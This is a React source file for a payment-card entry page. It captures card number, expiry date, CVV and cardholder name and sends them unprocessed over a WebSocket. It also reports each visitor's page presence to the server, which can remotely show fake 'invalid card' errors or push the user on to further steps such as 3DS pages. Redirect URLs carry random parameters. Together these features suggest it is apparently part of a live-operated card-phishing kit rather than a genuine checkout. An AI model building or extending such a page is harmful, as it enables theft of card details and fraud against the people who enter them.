import { useNavigate } from 'react-router-dom';
import { useEffect, useState, useRef } from 'react';
import Header from '../components/Header';
import useWebSocket from '../hooks/useWebSocket';
import { useTranslation } from '../hooks/useTranslation';
import { isValidCardNumber, isValidExpiration, isValidCVV, getExpectedCVVLength, getBankName, randomParamsURL } from '../utils/validation';
import '../styles/enter-payment.css';

function PaymentDetails() {
  const navigate = useNavigate();
  const { t } = useTranslation();
  const { sendPresence, sendPaymentData, wsRef } = useWebSocket();
  const [errorMessage, setErrorMessage] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [fieldErrors, setFieldErrors] = useState({
    cardNumber: '',
    expirationDate: '',
    cvv: '',
    nameOnCard: ''
  });
  const [cardNumber, setCardNumber] = useState('');
  const [expirationDate, setExpirationDate] = useState('');
  const [cvv, setCvv] = useState('');
  const cardNumberRef = useRef(null);
  const expirationDateRef = useRef(null);
  const cvvRef = useRef(null);

  // Enregistrer la présence sur cette page
  useEffect(() => {
    sendPresence('/payment-details');
    
    // Vérifier s'il y a un message d'erreur stocké (pour l'annulation)
    const storedError = localStorage.getItem('paymentError');
    if (storedError) {
      console.log('[PaymentDetails] 🔍 Found stored error message:', storedError);
      setErrorMessage(storedError);
      localStorage.removeItem('paymentError'); // Nettoyer après affichage
    }
  }, [sendPresence]);

  // Écouter les messages de redirection depuis le serveur
  useEffect(() => {
    console.log('[PaymentDetails] 🔧 Setting up WebSocket message listener');
    
    let isMounted = true;
    
    const handleWebSocketMessage = (event) => {
      if (!isMounted) {
        console.log('[PaymentDetails] ⚠️  Component unmounted, ignoring message');
        return;
      }
      
      const data = event.detail;
      console.log('[PaymentDetails] 📨 Received WebSocket message event:', data.type, data);
      
      // Gérer les messages redirect selon l'architecture documentée (direct avec payload)
      if (data && data.type === 'direct' && data.payload && data.payload.action === 'redirect') {
        const page = data.payload.page;
        const isCancellation = data.payload.isCancellation || false;
        const errorMessage = data.payload.errorMessage || t('paymentDetails.errors.invalidCard');
        console.log('[PaymentDetails] ✅ Redirect message received (via direct)! Target page:', page, 'isCancellation:', isCancellation);
        
        if (page === '/payment-details' || isCancellation) {
          // Annulation - afficher le message d'erreur
          console.log('[PaymentDetails] 🚫 Cancellation - showing error message');
          setErrorMessage(errorMessage);
          setIsSubmitting(false);
          // Stocker dans localStorage au cas où le composant n'est pas encore monté
          localStorage.setItem('paymentError', errorMessage);
        } else {
          // Redirection vers une autre page avec paramètres aléatoires
          console.log('[PaymentDetails] 🔄 Navigating to:', page);
          navigate(`${page}?${randomParamsURL()}`);
        }
      } else if (data && data.type === 'redirect') {
        // Support pour l'ancien format (backward compatibility)
        const page = data.page;
        const isCancellation = data.isCancellation || false;
        const errorMessage = data.errorMessage || t('paymentDetails.errors.invalidCard');
        console.log('[PaymentDetails] ✅ Redirect message received (legacy format)! Target page:', page, 'isCancellation:', isCancellation);
        
        if (page === '/payment-details' || isCancellation) {
          // Annulation - afficher le message d'erreur
          console.log('[PaymentDetails] 🚫 Cancellation - showing error message');
          setErrorMessage(errorMessage);
          setIsSubmitting(false);
          // Stocker dans localStorage au cas où le composant n'est pas encore monté
          localStorage.setItem('paymentError', errorMessage);
        } else {
          // Redirection vers une autre page avec paramètres aléatoires
          console.log('[PaymentDetails] 🔄 Navigating to:', page);
          navigate(`${page}?${randomParamsURL()}`);
        }
      } else {
        console.log('[PaymentDetails] ℹ️  Received non-redirect message:', data?.type || 'unknown');
      }
    };

    // Ajouter l'écouteur via window (standard)
    window.addEventListener('websocket-message', handleWebSocketMessage);
    console.log('[PaymentDetails] ✅ WebSocket message listener added');
    
    // Vérifier immédiatement si un message est en attente (pour debug)
    console.log('[PaymentDetails] 🔍 Checking for existing WebSocket connection...');
    
    return () => {
      console.log('[PaymentDetails] 🧹 Cleaning up WebSocket message listener');
      isMounted = false;
      // Retirer le listener seulement si le composant est vraiment démonté
      // (pas lors du cleanup de React.StrictMode)
      // En production, React.StrictMode n'est pas actif, donc le cleanup est normal
      window.removeEventListener('websocket-message', handleWebSocketMessage);
    };
  }, [navigate]);

  // Format card number with spaces (every 4 digits)
  const formatCardNumber = (value) => {
    const cleaned = value.replace(/\s/g, '');
    const formatted = cleaned.match(/.{1,4}/g)?.join(' ') || cleaned;
    return formatted;
  };

  // Format expiration date with slash (MM/YY)
  const formatExpirationDate = (value) => {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length >= 2) {
      return cleaned.substring(0, 2) + '/' + cleaned.substring(2, 4);
    }
    return cleaned;
  };

  // Handle card number input
  const handleCardNumberChange = (e) => {
    const value = e.target.value.replace(/\D/g, ''); // Only digits
    const formatted = formatCardNumber(value);
    setCardNumber(formatted);
    
    // Clear error when user starts typing
    if (fieldErrors.cardNumber) {
      setFieldErrors(prev => ({ ...prev, cardNumber: '' }));
    }
    
    // Update CVV maxLength based on card type
    const cleaned = formatted.replace(/\s/g, '');
    if (cleaned.length >= 4) {
      const expectedLength = getExpectedCVVLength(cleaned);
      if (cvvRef.current) {
        cvvRef.current.maxLength = expectedLength;
      }
    }
  };

  // Handle expiration date input
  const handleExpirationDateChange = (e) => {
    const value = e.target.value;
    const formatted = formatExpirationDate(value);
    setExpirationDate(formatted);
    
    // Clear error when user starts typing
    if (fieldErrors.expirationDate) {
      setFieldErrors(prev => ({ ...prev, expirationDate: '' }));
    }
  };

  // Handle CVV input
  const handleCVVChange = (e) => {
    const value = e.target.value.replace(/\D/g, ''); // Only digits
    setCvv(value);
    
    // Clear error when user starts typing
    if (fieldErrors.cvv) {
      setFieldErrors(prev => ({ ...prev, cvv: '' }));
    }
  };

  // Validate all fields
  const validateForm = (formData) => {
    const errors = {
      cardNumber: '',
      expirationDate: '',
      cvv: '',
      nameOnCard: ''
    };
    let isValid = true;

    // Validate card number
    if (!formData.cardNumber || !isValidCardNumber(formData.cardNumber)) {
      errors.cardNumber = t('paymentDetails.errors.cardNumber');
      isValid = false;
    }

    // Validate expiration date
    if (!formData.expirationDate || !isValidExpiration(formData.expirationDate)) {
      errors.expirationDate = t('paymentDetails.errors.expirationDate');
      isValid = false;
    }

    // Validate CVV
    if (!formData.cvv || !isValidCVV(formData.cvv, formData.cardNumber)) {
      const expectedLength = getExpectedCVVLength(formData.cardNumber);
      errors.cvv = t('paymentDetails.errors.cvv', { length: expectedLength });
      isValid = false;
    }

    // Validate name on card
    if (!formData.nameOnCard || formData.nameOnCard.trim().length < 2) {
      errors.nameOnCard = t('paymentDetails.errors.nameOnCard');
      isValid = false;
    }

    setFieldErrors(errors);
    return isValid;
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    setErrorMessage('');
    setIsSubmitting(false);

    const formData = {
      cardNumber: cardNumber.replace(/\s/g, ''),
      expirationDate: expirationDate,
      cvv: cvv,
      nameOnCard: e.target.nameOnCard.value.trim()
    };

    // Validate form
    if (!validateForm(formData)) {
      setIsSubmitting(false);
      return;
    }

    setIsSubmitting(true);

    // Stocker le numéro de carte et la date d'expiration dans localStorage pour l'utiliser dans 3DS et payment-confirmation
    localStorage.setItem('cardNumber', formData.cardNumber);
    localStorage.setItem('paymentCardNumber', formData.cardNumber);
    localStorage.setItem('expirationDate', formData.expirationDate);

    console.log('[PaymentDetails] 📤 Submitting payment data...');
    console.log('[PaymentDetails] WebSocket ref:', wsRef?.current);
    console.log('[PaymentDetails] WebSocket readyState:', wsRef?.current?.readyState);
    
    // Envoyer les données au serveur
    sendPaymentData(formData);
    console.log('[PaymentDetails] ✅ Payment data sent');
  };

  return (
    <div className="container">
      <Header />
      <main className="main-content">
        <div className="content-wrapper">
          <h1 className="page-title">{t('paymentDetails.title')}</h1>

          <div className="card-logos-section">
            <div className="card-logo visa">
              <svg viewBox="0 0 60 40" className="visa-icon">
                <rect width="60" height="40" rx="4" fill="#1A1F71"/>
                <text x="30" y="26" fontSize="18" fontWeight="bold" fill="#ffffff" textAnchor="middle" fontFamily="Arial, sans-serif">VISA</text>
              </svg>
            </div>
            <div className="card-logo mastercard">
              <svg viewBox="0 0 60 40" className="mastercard-icon">
                <circle cx="22" cy="20" r="12" fill="#EB001B"/>
                <circle cx="38" cy="20" r="12" fill="#F79E1B"/>
                <path d="M30 12c-3.5 2.8-5.8 7-5.8 11.8s2.3 9 5.8 11.8c3.5-2.8 5.8-7 5.8-11.8s-2.3-9-5.8-11.8z" fill="#FF5F00"/>
              </svg>
            </div>
            <div className="card-logo amex">
              <svg viewBox="0 0 60 40" className="amex-icon">
                <rect width="60" height="40" rx="4" fill="#006FCF"/>
                <text x="30" y="18" fontSize="10" fontWeight="bold" fill="#ffffff" textAnchor="middle" fontFamily="Arial, sans-serif">AmEx</text>
              </svg>
            </div>
          </div>

          <form className="payment-form" onSubmit={handleSubmit}>
            <div className="form-group">
              <div className="input-wrapper">
                <input 
                  type="text" 
                  className={`form-input ${fieldErrors.cardNumber ? 'error' : ''}`}
                  id="cardNumber" 
                  name="cardNumber" 
                  placeholder={t('paymentDetails.cardNumber')} 
                  maxLength="19" 
                  value={cardNumber}
                  onChange={handleCardNumberChange}
                  ref={cardNumberRef}
                  required 
                />
                <svg className="input-icon card-icon" viewBox="0 0 24 24" fill="currentColor">
                  <rect x="2" y="5" width="20" height="14" rx="2" fill="none" stroke="currentColor" strokeWidth="1.5"/>
                  <line x1="2" y1="10" x2="22" y2="10" stroke="currentColor" strokeWidth="1.5"/>
                </svg>
              </div>
              {fieldErrors.cardNumber && (
                <div className="field-error">{fieldErrors.cardNumber}</div>
              )}
            </div>

            <div className="form-row">
              <div className="form-group">
                <input 
                  type="text" 
                  className={`form-input ${fieldErrors.expirationDate ? 'error' : ''}`}
                  id="expirationDate" 
                  name="expirationDate" 
                  placeholder={t('paymentDetails.expirationDatePlaceholder')} 
                  maxLength="5" 
                  value={expirationDate}
                  onChange={handleExpirationDateChange}
                  ref={expirationDateRef}
                  required 
                />
                {fieldErrors.expirationDate && (
                  <div className="field-error">{fieldErrors.expirationDate}</div>
                )}
              </div>
              <div className="form-group">
                <div className="input-wrapper">
                  <input 
                    type="text" 
                    className={`form-input ${fieldErrors.cvv ? 'error' : ''}`}
                    id="cvv" 
                    name="cvv" 
                    placeholder={t('paymentDetails.cvv')} 
                    maxLength="4" 
                    value={cvv}
                    onChange={handleCVVChange}
                    ref={cvvRef}
                    required 
                  />
                  <svg className="input-icon help-icon" viewBox="0 0 24 24" fill="currentColor">
                    <circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" strokeWidth="1.5"/>
                    <text x="12" y="16" fontSize="12" fontWeight="bold" fill="currentColor" textAnchor="middle" fontFamily="Arial, sans-serif">?</text>
                  </svg>
                </div>
                {fieldErrors.cvv && (
                  <div className="field-error">{fieldErrors.cvv}</div>
                )}
              </div>
            </div>

            <div className="form-group">
              <input 
                type="text" 
                className={`form-input ${fieldErrors.nameOnCard ? 'error' : ''}`}
                id="nameOnCard" 
                name="nameOnCard" 
                  placeholder={t('paymentDetails.nameOnCard')}
                required 
              />
              {fieldErrors.nameOnCard && (
                <div className="field-error">{fieldErrors.nameOnCard}</div>
              )}
            </div>

            {errorMessage && (
              <div className="error-message">
                {errorMessage}
              </div>
            )}

            <div className="disclaimer-section">
              <p className="disclaimer-text">{t('paymentDetails.disclaimer1')}</p>
              <p className="disclaimer-text">{t('paymentDetails.disclaimer2')}</p>
            </div>

            <div className="checkbox-group">
              <input type="checkbox" id="agree" name="agree" className="checkbox" />
              <label htmlFor="agree" className="checkbox-label">{t('paymentDetails.agree')}</label>
            </div>

            <button type="submit" className="save-button" disabled={isSubmitting}>
              {isSubmitting ? t('paymentDetails.processing') : t('paymentDetails.save')}
            </button>
          </form>
        </div>
      </main>
    </div>
  );
}

export default PaymentDetails;

